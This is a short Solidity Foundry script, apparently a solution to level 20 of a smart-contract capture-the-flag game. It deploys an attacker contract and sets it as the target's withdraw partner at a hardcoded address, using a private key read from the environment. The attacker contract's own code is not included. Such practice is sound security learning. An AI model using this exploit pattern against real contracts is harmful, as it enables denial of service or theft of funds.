// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Level20.sol";
import "../src/Level20-Attacker.sol";

contract AttackerScript is Script {
    Level20 level20 = Level20(payable(0x3bAF8bbEFb3AcbadE58cae44Ba87869987d94E09));
    Level20Attacker attacker;

    function run() public {
      vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
      attacker = new Level20Attacker();
      level20.setWithdrawPartner(address(attacker));
      vm.stopBroadcast();
    }
}
